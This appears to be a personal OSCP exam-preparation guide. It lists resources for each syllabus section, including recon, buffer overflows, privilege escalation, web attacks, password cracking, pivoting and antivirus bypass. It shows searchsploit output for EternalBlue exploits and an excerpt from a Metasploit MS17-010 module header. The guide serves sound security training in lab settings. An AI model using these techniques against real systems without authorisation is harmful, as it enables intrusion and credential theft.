https://support.offensive-security.com/oscp-exam-guide/ Most importantly: Have fun! You will learn a lot from this course, take your time to understand the material and this guide. Do not forget to take breaks and spend time away from the electronics. Trust me you do not want to burn yourself out. Course Syllabus: The 2 nd most important resource that I used to help me prepare for the course: https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf From the syllabus I will breakdown each section by providing you the resources I used to prepare for the course. Once I finish going through the syllabus, I will also be providing some extra resources that came in handy. You don\u2019t need to use this guide in order; feel free to jump around as it suits you. Section 1: Getting Comfortable with Kali Linux Kali Linux Revealed and Online Course: A good foundational course that helped me understand more about Kali Linux and it has a nice Linux Fundamentals section as well. Book Link: https://kali.training/downloads/Kali-Linux-Revealed-1 st -edition.pdf Online Course Link: https://kali.training/lessons/introduction/ Bash Scripting: The bash Guide: A good guide to get you into the bash scripting https://guide.bash.academy/ Linux Journey: A huge guide to learn about a variety of different things in Linux. All the lessons are free. https://linuxjourney.com/ Explainshell: Awesome resource that parses a variety of man pages from Ubuntu Manage Repository. It breaks down the commands you are using, but it is best to refer to the man pages if you have any questions: . https://www.explainshell.com/ Hands on challenge to get comfortable with Linux: Overthewire Bandit: https://overthewire.org/wargames/bandit/ Cmdchallenge.com: https://cmdchallenge.com/ HackerRank Linux Shell: https://www.hackerrank.com/domains/shell Books: The Linux Command Line (2 nd Edition is coming soon!): https://nostarch.com/tlcl2 Linux for Hackers: https://nostarch.com/linuxbasicsforhackers Section 2: Essential Tools in Kali Netcat: The TCP/IP Swiss Army tool. Experiment with this tool and understand what it does because you will be using this almost every day during the time in your course. SANS Netcat Cheatsheet: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf Ncat: A better version of netcat in my opinion. Supports SSL communication and it is part of Nmap. TCPDump: Command line base Network Analysis Tool. Very useful and good to know if you are on a system that does not have a gui interface. Here is a good cheat sheet I used for tcpdump when I needed to troubleshoot my exploits: https://www.andreafortuna.org/technology/networking/tcpdump-a-simple-cheatsheet/ Daniel Miessler TCPDump Guide: https://danielmiessler.com/study/tcpdump/ Wireshark: GUI based Network Analysis tool. There a lot of free PCAP\u2019s samples online that you can use to understand how Wireshark works. Be careful with downloading some of these PCAP files because they may contain malware on them :D PCAP Samples: Netresec: https://www.netresec.com/?page=pcapfiles Malware Traffic Analysis: https://www.malware-traffic-analysis.net/ Packettotal (Just like virustotal but for PCAP Analysis): https://packettotal.com/ Section 3: Passive Reconnaissance Take some time to learn about these tricks and techniques. They will certainly come in handy! Google Dorks: Using various google searches that you can find that may expose sensitive information about a target. SANS Google Dork Cheatsheet: https://www.sans.org/security-resources/GoogleCheatSheet.pdf Google Hacking Database: https://www.exploit-db.com/google-hacking-database Netcraft: https://netcraft.com/ Email Harvesting: theharvester: https://github.com/laramies/theharvester recon-ng: https://bitbucket.org/LaNMaSteR53/recon-ng/overview Additional Resources: Tools I did not use in the lab but I used them for preparation and they have come in handy for other tests. Domaintools: http://whois.domaintools.com/ MX Toolbox: https://mxtoolbox.com/DNSLookup.aspx Section 4: Active Reconnaissance Introduction to DNS: If you do not know what DNS is or how it works, here is a great guide that I used to better understand it from Digital Ocean: https://www.digitalocean.com/community/tutorials/an-introduction-to-dns-terminology-components-and-concepts If you think you have a good understanding of what DNS is then you will also need to understand how to perform forward and reverse lookups. In addition, you should also know how zone transfers work and how to perform them. Performing these tests will certainly help you better understand what your targets are in the lab. For more information about these techniques check out this article here: https://resources.infosecinstitute.com/dns-enumeration-techniques-in-linux/#gref Tools for DNS Enumeration: Dnsrecon Created by Darkoperator: https://github.com/darkoperator/dnsrecon Network Scanning: Nmap: A tool that you should 100% totally learn about. You will probably use this everyday (If not most of the time while you are in the lab). I highly recommend you take some time to learn what the tool does, how each command switch works, each scanning technique you can run, and any other capabilities. Nmap is a powerful tool that has the ability to determine what hosts are online, what services they are running, what operating system is running on that host, and dozens of characteristics. In addition, one of the most powerful features that you should also learn is the Nmap Scripting Engine (NSE). With NSE scripts you have the ability automate a wide variety of networking tasks for your scans including vulnerability detection and exploitation. Here are my resources that I used to learn more about Nmap: Nmap Official Guide: I used this more than the man pages. I highly recommend purchasing the full book since the official guide is missing a few chapters, such as \u201cDetecting and Subverting Firewalls and Intrusion Detection Systems\u201d, \u201cOptimizing Nmap Performance\u201d, \u201cPort Scanning Techniques and Algorithms\u201d, \u201cHost Discovery (Ping Scanning)\u201d, and more. https://nmap.org/book/toc.html Link for Nmap Network Scanning Book (if you want to purchase it): https://www.amazon.com/Nmap-Network-Scanning-Official-Discovery/dp/0979958717 SANS Nmap Cheatsheet: https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf Nmap Scripting Engine (NSE): https://nmap.org/book/man-nse.html ZephrFish Nmap Blog: https://blog.zsec.uk/nmap-rtfm/ Service Enumeration: There are a variety of services running on so many systems\u2026take the time to understand them! Do not just scan them and move on. Take some time to look at each of them because they could be a key for you to obtain shell access on a system! Abatchy provided a link from 0day security that gave me a lot of ideas and things to look for that I may have missed when I skipped some the of the services in the lab. You can find that resource here: http://0daysecurity.com/penetration-testing/enumeration.html Highoncoffee Penetration Testing Cheatsheet: https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/ Section 5: Vulnerability Scanning I did not spend too much time in this section for preparation because vulnerability scanners are simple and easy to configure. In addition, the purpose of a vulnerability scanner is to identify security holes in services or in a operating system. These scanners rely on a database that contains the necessary information needed to conduct a scan. A word of caution! Be careful when you use vulnerability scanners on your targets because there is a chance that some of the plugins or features can cause an impact to your target such as taking down that service, locking out user accounts, and even crash the system. In the syllabus the tool recommends that you use OpenVAS since it is a full-featured vulnerability scanner. However, there are other vulnerability scanners out there and I highly recommend playing with Nessus: https://www.tenable.com/products/nessus/nessus-professional The reason why I am stating that you should use Nessus is because it is more stable on Kali Linux and it has simple straightforward interface. I also was able to use the Nessus Home key for most of my testing and to help me get more familiar with how these vulnerability scanners work. Nessus is a real popular tool for vulnerability scanning in the infosec world and I certainly encourage you to play with it! For instructions on how to install Nessus on Kali Linux you can find it here: https://www.tenable.com/blog/getting-started-with-nessus-on-kali-linux For obtaining a Nessus key you can grab one here: https://www.tenable.com/products/nessus-home Section 6: Buffer Overflows My favorite section to learn about! The material provided in the PWK was fantastic and really straightforward. Throughout the internet you will probably find a variety of different resources to help you understand how buffer overflows work. With that being said I will provide some of my notes and resources that helped me understand how buffer overflows. Corelan Team: A huge shout out to these guys because their articles from information security to exploit development are absolutely incredible! They have an article they posted about Stack Based Overflows that gave me a better understanding of identifying a buffer overflow in an application: Part 1: https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/ Part 2: https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/ Once I finished reading the articles I decided to start going through write-ups and forums where people manually identified buffer overflows in certain applications. With these walkthroughs I used Exploit-DB to check if they had the vulnerable application in many cases. I won\u2019t provide any of these walkthroughs but I will at least provide the binaries that you can use to manually identify buffer overflows. Windows Binaries (Recommend that you run these on Windows 7/XP 32 bit): Vulnserver: https://samsclass.info/127/proj/vuln-server.htm Minishare 1.4.1: https://www.exploit-db.com/exploits/636 Savant Web Server 3.1: https://www.exploit-db.com/exploits/10434 Freefloat FTP Server 1.0: https://www.exploit-db.com/exploits/40673 Core FTP Server 1.2: https://www.exploit-db.com/exploits/39480 Linux Binaries: Linux Buffer Overflow: https://samsclass.info/127/proj/lbuf1.htm Vulnerable Boxes: Brainpan 1: https://www.vulnhub.com/entry/brainpan-1,51/ Pinky\u2019s Palace version 1: https://www.vulnhub.com/entry/pinkys-palace-v1,225/ Other Resources: Whitepaper Introduction to Immunity Debugger: https://www.sans.org/reading-room/whitepapers/malicious/basic-reverse-engineering-immunity-debugger-36982 Buffer Overflows for Dummies: https://www.sans.org/reading-room/whitepapers/threats/buffer-overflows-dummies-481 Vortex Stack Buffer Overflow Practice: https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/ Smashing the Stack For Fun and Profit: http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf Section 7: Handling Public Exploits There will come a time that you will need to use a public exploit on your target to see if you can obtain a shell on it. With that exploit you may need to modify shellcode or even parts of the exploit to match with your system to obtain a connection from your target. A word of advice: Before you download a public exploit I would consider you take some time to review the code and understand what the exploit is suppose to actually too. If you do not understand how the code works\u2026do some research!!! I am absolutely positive you can find proof of concepts online and walkthroughs that will explain how the exploit actually works. Not all exploits are going to work right out of the box you will need to configure them to make sure they can reach back to your attacking system. If you do not review the exploit code or make any modifications, then you are running risk that the exploit will fail, crash your target system/service, or it may allow other users to connect into the system. Places to find exploits: https://www.exploit-db.com/ https://packetstormsecurity.com/files/tags/exploit/ Tools for finding exploits: Searchsploit: a command line search tool for Exploit-DB that has a repo of Exploit Database with you. Command Examples: searchsploit MS-17-010 : finds all cases/exploits linked to MS17-010 1 2 3 4 5 6 7 8 9 10 11 12 13 14 root@kali:~# searchsploit ms17-010 --------------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) --------------------------------------------------------------------------------------------------- ---------------------------------------- Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution | exploits/windows/remote/43970.rb Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit) | exploits/windows/dos/41891.rb Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010) | exploits/windows_x86-64/remote/41987.py Microsoft Windows Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) | exploits/windows/remote/42031.py Microsoft Windows Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution | exploits/windows/remote/42315.py Microsoft Windows Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010) | exploits/windows_x86-64/remote/42030.py --------------------------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result searchsploit -x /usr/share/exploitdb/exploits/windows/remote/43970.rb : The -x command switch allows you to examine the exploit code or information about the exploit. You can also upload nmap xml files to Searchsploit so it can find available exploits that match your target. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 root @kali :~ # searchsploit -x /usr/share/exploitdb/exploits/windows/remote/43970.rb Snippet of the exploit : ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## # Windows XP systems that are not part of a domain default to treating all # network logons as if they were Guest. This prevents SMB relay attacks from # gaining administrative access to these systems. This setting can be found # under: # # Local Security Settings > # Local Policies > # Security Options > # Network Access: Sharing and security model for local accounts class MetasploitModule < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: SMB :: Client :: Psexec_MS17_010 include Msf :: Exploit :: Powershell include Msf :: Exploit :: EXE include Msf :: Exploit :: WbemExec include Msf :: Auxiliary :: Report def initialize ( info = {}) super ( update_info ( info , 'Name' => 'MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution' , 'Description' => %q{ This module will exploit SMB with vulnerabilities in MS17-010 to achieve a write-what-where primitive. This will then be used to overwrite the connection session information with as an Administrator session. From there, the normal psexec payload code execution is done. Exploits a type confusion between Transaction and WriteAndX requests and a race condition in Transaction requests, as seen in the EternalRomance, EternalChampion, and EternalSynergy exploits. This exploit chain is more reliable than the EternalBlue exploit, but requires a named pipe. Play with some of the other command switches that Searchsploit has because it will make it much easier for you to find exploits on your kali box. Section 8: Transferring Files to your target Depending on the target system you obtain access too you may not have the ability to transfer exploits or other tools you need to that system. With this being said you will need to figure out some techniques to transfer files to and from your target system. Here are a few guides I used to get a better understanding of how to transfer files onto Windows and Linux systems: Awakened: Transfer files from Kali to the target machine https://awakened1712.github.io/oscp/oscp-transfer-files/ Ropnop Transferring Files from Linux to Windows (post-exploitation): https://blog.ropnop.com/transferring-files-from-kali-to-windows/ One tool that I also found interesting to transfer files on windows systems is using bitsadmin. The tool is a command-line tool that you can use to create download or upload jobs and monitor their progress. You can find examples on how to use the tool here: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-examples Another tool you can check out is Impacket . This tool contains a variety of programming classes that you can use to interact with target networks to parse raw data or you can be able to use their scripts to transfer files to or from your target host. Also check out python modules like these: Python -m SimpleHTTPServer 80 : Spins up a webserver in the directory you are located on port 80. Python3 -m http.server 80 : Spins up a python version 3.X web server in the directory you are located on port 80. Python -m pyftpdlib -p 21 -w : spins up a FTP server in the directory you are located on port 21 and it allows anonymous login access. Python3 -m pyftpdlib -p 21 -w : spins up a Python 3.X FTP server in the directory you are located on port 21 and it allows anonymous login access. Section 9: Privilege Escalation In this section you will find a lot of techniques that range from getting administrative access from a kernel exploit or through a misconfigured service. The possibilities are endless, and make sure you find the ones that will work for you. In order to get an understanding of this section I recommend applying your knowledge through Vulnhub or Hackthebox to improve your skills in this area. I know there are scripts for automating this process but at some points those scripts can miss something very important on your target that you need to escalate your privileges. Something you should keep in mind :D. For this section I am going to break into two parts: Windows and Linux Privilege Escalation Techniques. Windows Privilege Escalation Guides: Fuzzysecurity Windows Privilege Escalation Fundamentals: Shout out to fuzzysec for taking the time to write this because this is an amazing guide that will help you understand Privilege escalation techniques in Windows. http://www.fuzzysecurity.com/tutorials/16.html Pwnwiki Windows Privilege Escalation Commands: http://pwnwiki.io/#!privesc/windows/index.md Absolomb\u2019s Security Blog: Windows Privilege Escalation Guide https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ Pentest.blog: Windows Privilege Escalation Methods for Pentesters https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ Windows Privilege Escalation Tools: JAWS (Created by 411Hall): A cool windows enumeration script written in PowerShell. https://github.com/411Hall/JAWS/commits?author=411Hall Windows Exploit Suggester (Created by GDSSecurity): A python script that compares target patch against Microsoft vulnerability database to detect any missing patches on the target. https://github.com/GDSSecurity/Windows-Exploit-Suggester Windows Exploit Suggester Next Generation: https://github.com/bitsadmin/wesng Sherlock (Created by RastaMouse): Another cool PowerShell script that finds missing software patches for local privilege escalation techniques in Windows. https://github.com/rasta-mouse/Sherlock Other Resources for Windows Privilege Escalation Techniques: [ https://medium.com/@rahmatnurfauzi/windows-privilege-escalation-scripts-techniques-30fa37bd194(https://medium.com/@rahmatnurfauzi/windows-privilege-escalation-scripts-techniques-30fa37bd194 ) Linux Privilege Escalation Guides: The only guide I probably ever used to help me understand privilege escalation techniques in Linux systems was from g0tmi1k post. This blog is a must that everyone should have for preparing for the OSCP in my opinion. You can find his guide here: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ GTFOBins (I have to thank Ippsec for sharing this with me): Contains a curated list of Unix binaries that that have the ability to be exploited by an attacker to bypass local security restrictions on a Linux system. https://gtfobins.github.io/ Linux Privilege Escalation Tools: LinEnum: A great Linux privilege escalation checker that is still maintained by the guys at rebootuser.com. You can find there tool here: https://github.com/rebootuser/LinEnum Linux Exploit Suggester 2: https://github.com/jondonas/linux-exploit-suggester-2 One thing that I will mention is if you want to practice your Linux privilege escalation, I highly recommend you take a look at Lin.Security vulnerable box created by in.security! The box was designed to help people understand how certain applications and service that are misconfigured can be easily abused by an attacker. This box really helped me improved my privilege escalation skills and techniques on Linux systems. Main Link: https://in.security/lin-security-practise-your-linux-privilege-escalation-foo/ Backup: https://www.vulnhub.com/entry/linsecurity-1,244/ Section 10: Client-Side Attacks Running Client-Side Attacks usually require client interaction so it\u2019s good to have an understanding of how this works and also how you can set one up. For instance, check out the Client Side Attack Section in Metasploit Unleashed: https://www.offensive-security.com/metasploit-unleashed/client-side-attacks/ If you need some information on how a Client Side Attack works check out this post on nttsecurity: https://technical.nttsecurity.com/post/102ej16/what-are-client-side-attacks Section 11: Web Application Attacks This section is the one I spent most of time preparing for PWK and OSCP. In this section you need to understand the following web attacks: cross-site scripting (XSS): OWASP: https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) SQL Injections: OWASP: https://www.owasp.org/index.php/SQL_Injection Pentest Monkey SQL Cheat Sheets: http://pentestmonkey.net/category/cheat-sheet/sql-injection File Inclusion Vulnerabilities. https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/ Tools for finding Web Vulnerabilities and conducting Web Attacks: Burp Suite: A popular web application vulnerability scanner that contains a variety of features and plugins to identify web vulnerabilities on certain web applications. The tool uses an interception proxy that connects to your browser to route traffic through the Burp Suite proxy client. Once the interception proxy is configured you can start capturing and analyzing each request to and from the target web application. With these\u2019s captured requests a penetration tester can analyze, manipulate, and fuzz individual HTTP requests in order to identify potential parameters or injection points manually. Bugcrowd University has a webinar that Jason Haddix created explaining about burp suite and how you can use it. You can find this recording here: https://www.bugcrowd.com/resource/introduction-to-burp-suite/ SQL Injection Tools: I would not recommend using these tools until you have a clear understaning about SQL Databases and how a SQL Injection works. These tools below make it easy to automate the process for conducting a SQL Injection but it is possible that they can causes issues to a targets SQL Database. Here are a list of tools that I have played with to get a better understanding of how you can automate SQL Injections: SQLmap: https://github.com/sqlmapproject/sqlmap/wiki/Usag NoSQLMap: https://github.com/codingo/NoSQLMap SQLNinja: http://sqlninja.sourceforge.net/ Nikto (Created by Chris Sullo): A web server scanner which performs comprehensive tests against web servers for multiple items. This tool can be able to scan for vulnerbalilities on the web application, checks for server configuration that include multiple index files, HTTP server options, and will attempt to identify installed the version of the web server, and any plugins/software that is running on it. Please keep this in mind that this tool is can be very noisy when scanning a targets web server. Link: https://cirt.net/Nikto2 Web Directory Scanners: These tools are designed to brute force site structure including directories and files in websites. These tools can be able to identify hidden directory scrtuctures or webpages that can come in handy when you are in the labs or during your assessment. Dirsearch: https://github.com/maurosoria/dirsearch Dirbuster: https://tools.kali.org/web-applications/dirbuster Gobuster: https://github.com/OJ/gobuster Wfuzz: https://github.com/xmendez/wfuzz Hands on areas to improve your web attack skills: Metasploitable 2: Contains Vulnerable Web Services such as Multidae and the Damn Vulnerable Web App (DVWA) that you can use to improve your web skills. Link to download the machine: https://metasploit.help.rapid7.com/docs/metasploitable-2 Backup Link: https://www.vulnhub.com/entry/metasploitable-2,29/ Exploitability Guide: https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide OWASP Juice Shop: Another vulnerable web application that contains a variety of challenges to improve your web skills. https://www.owasp.org/index.php/OWASP_Juice_Shop_Project Overthewire Natas: A set of wargame challenges that are web base that you will need to complete in order to move to the next round. I really enjoyed their challenges when I did them! http://overthewire.org/wargames/natas/ Other resources: Hack This Site: https://www.hackthissite.org/ Section 12: Password Cracking In this section you need to understand the basics of password attacks. Identify the differences between Windows (NTLM) hashes and Linux hashes. In addition, you will also need to understand the different tools that you can use to conduct online and offline password attacks. Here is a list of resources that I have used that helped me better understand how password cracking works: Introduction to Password Cracking: https://alexandreborgesbrazil.files.wordpress.com/2013/08/introduction_to_password_cracking_part_1.pdf Offline Tools for Password Cracking: Hashcat: https://hashcat.net/hashcat/ Sample Hashes to test with Hashcat: https://hashcat.net/wiki/doku.php?id=example_hashes John the Ripper: https://www.openwall.com/john/ Metasploit Unleashed using John the Ripper with Hashdump: https://www.offensive-security.com/metasploit-unleashed/john-ripper/ Online Tools for Password Cracking: THC Hydra: https://github.com/vanhauser-thc/thc-hydra Medusa: http://h.foofus.net/?page_id=51 Wordlist generators: Cewl: https://digi.ninja/projects/cewl.php Crunch: https://tools.kali.org/password-attacks/crunch Wordlists: In Kali: /usr/share/wordlists Seclists: apt-get install seclists You can find all of his password lists here: https://github.com/danielmiessler/SecLists/tree/master/Passwords Online Password Crackers: I usually went for these first to see if they had the hash cracked in their database. However, don\u2019t use these online crackers as your main tools for everything. Uploading a hash from an engagement can be a huge risk so make sure you use your offline tools to crack those types of hashes. Here is a list of online hash crackers that I found online that you can use to crack hashes: https://hashkiller.co.uk/Cracker https://www.cmd5.org/ https://www.onlinehashcrack.com/ https://gpuhash.me/ https://crackstation.net/ https://crack.sh/ https://hash.help/ https://passwordrecovery.io/ http://cracker.offensive-security.com/ Other Resources for Password Cracking: Pwning Wordpress Passwords: https://medium.com/bugbountywriteup/pwning-wordpress-passwords-2caf12216956 Section 13: Port Redirection and Pivoting Depending on your scope, some of the machines may not be directly accessible. There are systems out there that are dual homed, which allow you to connect into an internal network. You will need to know some of these techniques in order to obtain access into there non-public networks: Abatchy\u2019s Port Forwarding Guide: https://www.abatchy.com/2017/01/port-forwarding-practical-hands-on-guide Windows Port Forwarding: http://woshub.com/port-forwarding-in-windows/ SSH Tunneling Explained: https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/ Understanding Proxy Tunnels: https://www.offensive-security.com/metasploit-unleashed/proxytunnels/ Understanding Port forwarding with Metasploit: https://www.offensive-security.com/metasploit-unleashed/portfwd/ Explore Hidden Networks with Double Pivoting: https://pentest.blog/explore-hidden-networks-with-double-pivoting/ 0xdf hacks stuff. Pivoting and Tunneling: https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html Tools to help you with Port Forwarding and Pivoting: Proxychains: https://github.com/haad/proxychains Proxychains-ng: https://github.com/rofl0r/proxychains-ng SSHuttle (Totally Recommend learning this): https://github.com/sshuttle/sshuttle SSHuttle Documentation: https://sshuttle.readthedocs.io/en/stable/ Vulnerable systems to practice pivoting: Wintermute: https://www.vulnhub.com/entry/wintermute-1,239/ Section 14: Metasploit Framework The only guide that I used to learn more about Metasploit is Offensive Security Metasploit Unleashed course\u2026which is free! https://www.offensive-security.com/metasploit-unleashed/ Other Resources: Metasploit The Penetration Tester\u2019s Guide (A super awesome book to read): https://nostarch.com/metasploit Msfvenom Cheat Sheets: http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/ https://netsec.ws/?p=331 https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom Section 15: Antivirus Bypassing I did not spend too much time learning about this section since Metasploit encodes it payloads to bypass most anti-virus (well older versions at least). The course is pretty straight forward in this section. Tools to play with Anti-Virus evasion: Veil-Framework: https://github.com/Veil-Framework/Veil Extra Resources This concludes the resources I have used that helped me understand the course syllabus. Now I will share with you some tips and extra resources that I used during my preparation for the PWK/OSCP. Setting up your Pentesting Environment The course recommends that you are using VMware products to run the custom Kali Linux image that they have created. Windows users can purchase VMware Workstation or use their free program VMware Player . As for MAC Users you will need to use VMware Fusion . If you would like to download the custom Kali Linux System for the PWK you can find it here: https://images.offensive-security.com/pwk-kali-vm.7z Keep in mind that Offensive Security does update their images from time to time. Personally, I only used their image for completing the lab exercises and I had a separate Kali Linux image that I customized to use for the labs and exam. Another virtual machine I created was a Windows 7 32-bit system to spin up any vulnerable applications I needed to debug or to check if I could obtain a shell from them. You could also create a Windows 7 64-bit system as well but some of 32-bit applications may not work properly as they would on an actual 32-bit system. This practice is great to implement in case you are stuck on a windows system that is running a service that for some reason you cannot obtain a shell on. Wargames/Hands-on Challenges I know I stated theses before but I am going to reiterate this: OverTheWire Bandit: A good set of fun Linux challenges to get yourself familiarizes with bash and Linux. Abatchys walkthrough really helped me here: Bandit 1-5: https://www.abatchy.com/2016/10/overthewire-bandit-0-5 Bandit 6-10: https://www.abatchy.com/2016/10/overthewire-bandit-6-10 Bandit 11-15: https://www.abatchy.com/2016/10/overthewire-bandit-11-15 Bandit 16-20: https://www.abatchy.com/2016/10/overthewire-bandit-16-20 Bandit 21-26: https://www.abatchy.com/2016/10/overthewire-bandit-21-24 OverTheWire Natas: A good set of simple web application challenges. These challenges will help you understand the basics you need to identify issues in web applications. Check out this walkthrough here: https://infamoussyn.wordpress.com/2014/02/05/overthewire-natas-level-0-16-writeup-updated/ UndertheWire: Probably my favorite place for challenges because they contain a huge set of PowerShell challenges. You can find their challenges here: http://www.underthewire.tech/wargames.htm Root-me.org: A huge place that has challenges for almost everything in cybersecurity. For instance, you will see challenges in the following areas: Network Forensics (Packet Analysis, Captured Traffic, Network Services) Programming (C, PHP, Java, Shell-coding) Reverse Engineering (disassemble applications) Web Applications and Client Challenges. Forensic Challenges. Spend a few minutes going through some of these! SANS Holiday Hack Challenges: https://www.holidayhackchallenge.com/past-challenges/ Capture the Flag Competitions (CTFs)/Cyber Competitions I know some of you are reading this are probably skeptical on why I added this\u2026well to be honest the cybersecurity careers that we are in are not a normal 7am-3pm job\u2026it is a lifestyle. I understand for many of us that it is hard to set some time to do all of the things in this field and that is totally OK! If you have the time or if you already can, set some time out of your busy schedule to do a CTF. Go ahead and hack all of the things that many of these CTFs provide as challenges. Trust me you will learn some cool things in a CTF that not even a class may be able to teach you. Personally, competing in CTFs did help me in this course and also it gave me a better understanding of what things I should be looking for instead of jumping into rabbit holes! Also do not be scared to compete in a CTF if it is your first time! Everyone has to start somewhere in their journey you just have to keep pushing forward. So, go out there and find some CTFs whether they are local to you or online make some time and have confidence in doing them. If you cannot find any local CTFs check out CTFTime for online competitions that you can participate in. A lot of the cyber competitions in the past few years really helped me build my skills and I still go out once in awhile to find a CTF to compete in for fun \ud83d\ude0a. Bug Bounty Programs A great place to practice your skills and to make some possible profit as well! There are many bug bounty programs like Bugcrowd and Hackerone that you can participate for free. If you have never participated in bug bounty before check out Bugcrowd University as they provide a vast amount of material and resources to help you get started: https://www.bugcrowd.com/university/ Vulnerable Machines Boot-to-Root Vulnerable Machines! These machines are excellent to help you build your skills for pentesting. There are places where you can download them and run them on your system to begin practice or places where you can connect to their range and start hacking into the targets they have. Most of them result in obtaining root or Administrative/System level access in the end. Personally, my two favorite places are Hackthebox and Vulnhub. Hackthebox : An online penetration testing platform that contains a variety of machines to help you improve your penetration testing skills. For those who have not gone through the registration you will need to pass a challenge to generate yourself an activation code. Once you have generated your activation code, then you will have the ability to access their range. In the free tier you are allowed to play with the 20 active machines they have and they cycle a new system in the range every week and retire an old one there as well. If you want to access to their retired machines you will have to get VIP access. It is a very affordable in my opinion, and worth it to invest in. If you do not have the funds to invest into Hackthebox, do not worry because you can certainly find these walkthroughs online (once the boxes are retired). One place I would definitely recommend to look at is IppSec Hackthebox Walkthroughs on YouTube! I love watching his videos because he goes through step by step on how to obtain access onto the target and how to escalate your privileges to obtain root access. Each box has a different scenario and IppSec always has something extra to throw in when he is doing his walkthroughs. With that being said I created a list of all of boxes that I did in Hackthebox that I thought were OSCP Like. You can find them here and also check out IppSec playlist he created from the list I recommended to start watching! I will continue to be updating this list in the future, and if you would like to keep it around you can find it here and on NetSecFocus: https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159 HTB Boxes to Prepare for OSCP (Youtube Playlist): https://www.youtube.com/playlist?list=PLidcsTyj9JXK-fnabFLVEvHinQ14Jy5tf I want to give a huge thanks to ch4p and g0blin for starting Hackthebox! I am glad that I got to talk to you guys and I am grateful that we were able to help you guys out. I look forward to seeing you guys grow and will soon submit a box for you guys in the future! Vulnhub : Just like Hackthebox, except you have to download the vulnerable machines and run them on your local system. You will need VMware or VirtualBox (I recommend VMware workstation) to run these vulnerable systems. Please make sure that you are running these vulnerable systems on an isolated network and not on a public network. Thanks to g0tmi1k and his team for hosting this site and to the creators who submit these vulnerable machines. I have also created a list of vulnhub machines that I have found to be OSCP-Like as well. You can find them here and on NetSecFocus: I will continue to update this list and if you would like a copy for review you can certainly find it here: https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0 Rooting Vulnerable Machines is extremely important when you are preparing for PWK/OSCP because you can\u2019t depend on theoretical knowledge to pass. Improving your hands-on skills will play a huge key role when you are tackling these machines. Tips to participate in the Proctored OSCP exam As of August 15 th , 2018, all OSCP exams have a proctored exam. This means that a student will be monitored by an Offensive Security staff member through a screen sharing and webcam service. If you would like to learn more about this new proctoring process you can find it here: https://www.offensive-security.com/offsec/proctoring/ Before I took my exam, I had to go through a variety of things to make sure I was prepared to take my 1 st attempt. Even with my preparation, I lost 30 mins of my actual exam time due to troubleshooting the applications for the proctor on my end. With that being said, here are my tips to help you guys prepare for the proctoring section when you are ready to take the exam: Make sure your system is able to meet the software/hardware requirements that offensive security provides in order to run these services. You can find that information here: https://support.offensive-security.com/proctoring-faq/ Test your webcam to make sure it works. If you do not have a webcam for your system you can also use a spare laptop that has a webcam and connect the webcam session onto that system. The ScreenConnect application needs to be running on your main system that you will be using to connect to your exam. You can use multiple monitors for the exam. Keep in mind that the proctor must be able to see them and that they are connected to your system. The proctor will notify you about how many screens they see and you will need to confirm them with the number monitors you are using. If you use a system that has a monitor and it is not connected to the ScreenConnect application, then you will not be able to use that monitor for the exam. Be prepared and log into your webcam and screenconnect sessions 30 mins before your exam. Proctors cannot provide any assistance during the exam. You can take breaks, a nap, or grab a cup of coffee during your exam. Just make sure you notify the proctor when you leave and when you return for your exam. Also be dressed for your exam. I think that is pretty simple to understand why. For any other questions you may have you can check out Offensive Security FAQ for Proctored Exams here: https://www.offensive-security.com/faq/ Other Resources NetSecFocus Learning Resources: https://docs.google.com/spreadsheets/d/12bT8APhWsL-P8mBtWCYu4MLftwG1cPmIL25AEBtXDno/edit#gid=937533738 Books: Penetration Testing by Georgia Weidman. She also has a Cybrary Class: https://nostarch.com/pentesting Cybrary Class: https://www.cybrary.it/course/advanced-penetration-testing/ Kali Linux Revealed: https://www.kali.org/download-kali-linux-revealed-book/ Attacking Network Protocols: https://nostarch.com/networkprotocols Red Team Field Manual: https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504 Hash-Crack-Password-Cracking-Manual v3: https://www.amazon.com/Hash-Crack-Password-Cracking-Manual/dp/1793458618 The Hacker Playbook Series: https://securepla.net/hacker-playbook/ The Web Application Hacker 